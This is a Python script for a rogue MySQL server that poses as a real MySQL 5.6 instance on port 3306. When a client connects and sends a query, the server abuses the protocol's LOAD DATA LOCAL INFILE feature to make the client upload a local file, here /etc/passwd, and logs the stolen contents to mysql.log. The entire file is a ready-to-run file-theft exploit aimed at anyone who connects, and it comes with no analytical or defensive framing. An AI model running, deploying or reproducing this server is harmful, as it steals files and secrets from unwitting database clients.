#!/usr/bin/env python3
# coding: utf-8

import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers

PORT = 3306

log = logging.getLogger(__name__)
log.setLevel(logging.INFO)
tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
log.addHandler(tmp_format)

filelist = (
    '/etc/passwd',
)

__author__ = 'Gifts'

def daemonize():
    import os
    import warnings
    if os.name != 'posix':
        warnings.warn('Cant create daemon on non-posix system')
        return

    if os.fork(): os._exit(0)
    os.setsid()
    if os.fork(): os._exit(0)
    os.umask(0o022)
    null = os.open('/dev/null', os.O_RDWR)
    for i in range(3):
        try:
            os.dup2(null, i)
        except OSError as e:
            if e.errno != 9:
                raise
    os.close(null)

class LastPacket(Exception):
    pass

class OutOfOrder(Exception):
    pass

class mysql_packet:
    packet_header = struct.Struct('<Hbb')
    packet_header_long = struct.Struct('<Hbbb')

    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload.encode('latin1') if isinstance(payload, str) else payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
        else:
            header = mysql_packet.packet_header_long.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)

        return (header + self.payload).decode('latin1', errors='ignore')

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        if isinstance(raw_data, str):
            raw_data = raw_data.encode('latin1')
        packet_num = raw_data[0]
        payload = raw_data[1:]
        return mysql_packet(packet_num, payload)

class http_request_handler(asynchat.async_chat):
    def __init__(self, addr):
        super().__init__(sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.logined = False
        self.push(
            mysql_packet(
                0,
                ''.join((
                    '\x0a',
                    '5.6.28-0ubuntu0.14.04.1' + '\0',
                    '\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00',
                ))
            )
        )
        self.order = 1
        self.states = ['LOGIN', 'CAPS', 'ANY']

    def push(self, data):
        log.debug('Pushed: %r', data)
        if data is None:
            log.error('Attempted to push None — skipping push to avoid crash.')
            return
        if isinstance(data, str):
            data = data.encode('latin1')
        elif isinstance(data, mysql_packet):
            data = str(data).encode('latin1')
        super().push(data)

    def collect_incoming_data(self, data):
        log.debug('Data recved: %r', data)
        self.ibuffer.append(data)

    def found_terminator(self):
        data = b"".join(self.ibuffer)
        self.ibuffer = []

        if self.state == 'LEN':
            len_bytes = data[0] + 256 * data[1] + 65536 * data[2] + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'
        elif self.state == 'MoreLength':
            if data[0] != 0:
                log.error('Invalid MoreLength packet — closing connection.')
                self.close_when_done()
            else:
                self.state = 'Data'
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    self.order = packet.packet_num + 2

                first_byte = packet.payload[0:1]
                if packet.packet_num == 0:
                    if first_byte == b'\x03':
                        log.info('Query')
                        filename = random.choice(filelist)
                        PACKET = mysql_packet(
                            packet,
                            '\xFB{}'.format(filename)
                        )
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET)
                    elif first_byte == b'\x1b':
                        log.info('SelectDB')
                        self.push(mysql_packet(
                            packet,
                            b'\xfe\x00\x00\x02\x00'
                        ))
                        raise LastPacket()
                    elif first_byte == b'\x02':
                        self.push(mysql_packet(
                            packet, b'\x00\x00\x00\x02\x00\x00\x00'
                        ))
                        raise LastPacket()
                    elif packet.payload == b'\x00\x01':
                        log.error('Received unexpected payload — closing connection.')
                        self.close_when_done()
                    else:
                        raise ValueError()
                else:
                    if self.sub_state == 'File':
                        log.info('-- result')
                        log.info('Result: %r', data)

                        if len(data) == 1:
                            self.push(
                                mysql_packet(packet, b'\x00\x00\x00\x02\x00\x00\x00')
                            )
                            raise LastPacket()
                        else:
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.order = packet.packet_num + 1
                    elif self.sub_state == 'Auth':
                        self.push(mysql_packet(
                            packet, b'\x00\x00\x00\x02\x00\x00\x00'
                        ))
                        raise LastPacket()
                    else:
                        log.info('-- else')
                        raise ValueError('Unknown packet')
            except LastPacket:
                log.info('Last packet')
                self.state = 'LEN'
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            except OutOfOrder:
                log.warning('Out of order — closing connection.')
                self.close_when_done()
        else:
            log.error('Unknown state — closing connection.')
            self.close_when_done()

class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        super().__init__(sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind(('', PORT))
            except socket.error:
                exit()
            self.listen(5)

    def handle_accept(self):
        pair = self.accept()
        if pair is not None:
            log.info('Conn from: %r', pair[1])
            http_request_handler(pair)

z = mysql_listener()
# daemonize()
asyncore.loop()
